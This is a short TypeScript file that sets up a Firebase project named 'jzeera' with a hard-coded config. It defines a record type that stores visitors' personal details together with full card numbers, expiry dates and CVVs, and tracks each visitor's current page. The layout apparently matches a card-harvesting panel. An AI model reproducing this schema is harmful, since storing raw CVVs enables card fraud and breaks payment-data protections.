import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBpctv_dcOCAEDsIdsNOqsoC4-CTd2mHNs",

  authDomain: "jzeera.firebaseapp.com",

  databaseURL: "https://jzeera-default-rtdb.firebaseio.com",

  projectId: "jzeera",

  storageBucket: "jzeera.firebasestorage.app",

  messagingSenderId: "409483644025",

  appId: "1:409483644025:web:ddf6ee6f1d1e6c363118a8",

  measurementId: "G-H1SZ5L79F8",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
